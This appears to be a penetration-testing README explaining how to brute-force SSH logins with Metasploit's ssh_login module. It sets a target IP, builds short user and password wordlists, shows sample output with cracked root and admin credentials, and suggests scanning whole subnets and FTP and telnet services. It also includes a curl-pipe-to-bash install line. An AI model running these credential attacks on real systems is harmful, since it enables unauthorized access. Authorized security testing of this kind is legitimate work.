
---

# **Metasploit Framework - SSH Login Brute-Force Module**

This repository contains detailed steps for using the **Metasploit Framework** and its **SSH Login Module (`auxiliary/scanner/ssh/ssh_login`)** to brute-force **SSH credentials** on a specified target system. This is useful for **penetration testing** and **red teaming** engagements.

---

## **⚠️ Disclaimer**
This guide is intended for **educational purposes only**. Unauthorized access or brute-forcing systems without proper permission is **illegal** and **punishable by law**. **Only use this guide in authorized testing environments.**

---

# **What Is Metasploit?**
[Metasploit](https://www.metasploit.com/) is a popular **penetration testing platform** that helps security professionals and ethical hackers identify, exploit, and validate vulnerabilities within systems.

---

---

# **Installation Guide**
---

### **Step 1: Install Metasploit Framework**
1. **Update the System:**
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

2. **Install Metasploit Framework:**
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | bash
   ```

3. **Launch Metasploit Console:**
   ```bash
   sudo msfconsole
   ```

---

# **Metasploit SSH Login Brute-Force Module**
---

## **Step 2: Load the SSH Login Module**
1. **Start Metasploit:**
   ```bash
   sudo msfconsole
   ```

2. **Load the SSH Login Module:**
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   ```

---

## **Step 3: Configure the Module**
1. **Set the Target Host:**
   ```bash
   set RHOSTS 192.168.8.144  # Replace with target IP
   ```

2. **Set the SSH Port (if custom):**
   ```bash
   set RPORT 2222  # Replace with your target SSH port
   ```

3. **Set the Username File:**
   ```bash
   set USER_FILE users.txt
   ```

4. **Set the Password File:**
   ```bash
   set PASS_FILE pass.txt
   ```

5. **Enable Bruteforce:**
   ```bash
   set BRUTEFORCE_SPEED 5
   ```

6. **Set Thread Count for Faster Execution:**
   ```bash
   set THREADS 4
   ```

7. **Enable Verbose Mode (Optional):**
   ```bash
   set VERBOSE true
   ```

---

## **Step 4: Run the Brute-Force Attack**
```bash
run
```

---

# **Expected Output Example**
```
[*] 192.168.8.144:2222 - Starting bruteforce with 4 threads
[+] 192.168.8.144:2222 - Success: 'admin:password'
[+] 192.168.8.144:2222 - Success: 'root:toor'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

---

# **Module Configuration Overview**
| **Option**          | **Description**                        |
|---------------------|----------------------------------------|
| `RHOSTS`            | Target IP address(es)                 |
| `RPORT`             | Target SSH port (default: 22)         |
| `USER_FILE`         | File containing a list of usernames   |
| `PASS_FILE`         | File containing a list of passwords   |
| `BRUTEFORCE_SPEED`  | Bruteforce speed (1-5, default: 5)    |
| `THREADS`           | Number of parallel threads            |
| `VERBOSE`           | Show each attempt (true/false)        |

---

# **Custom Wordlist Files**
1. Create a **Username File (`users.txt`)**:
   ```bash
   echo -e "admin\nroot\nuser" > users.txt
   ```

2. Create a **Password File (`pass.txt`)**:
   ```bash
   echo -e "password\n123456\ntoor" > pass.txt
   ```

---

# **Tips for Advanced Use**
- **Use IP Ranges:** 
  ```bash
  set RHOSTS 192.168.8.0/24
  ```

- **Test Multiple Services:**
  Use other modules like:
  ```
  use auxiliary/scanner/ftp/ftp_login
  use auxiliary/scanner/telnet/telnet_login
  ```

---

---

# **Security Recommendations**
- **Never run this against unauthorized targets.**
- **Use encrypted VPNs** when testing externally.
- **Document findings** for authorized penetration testing reports.

---
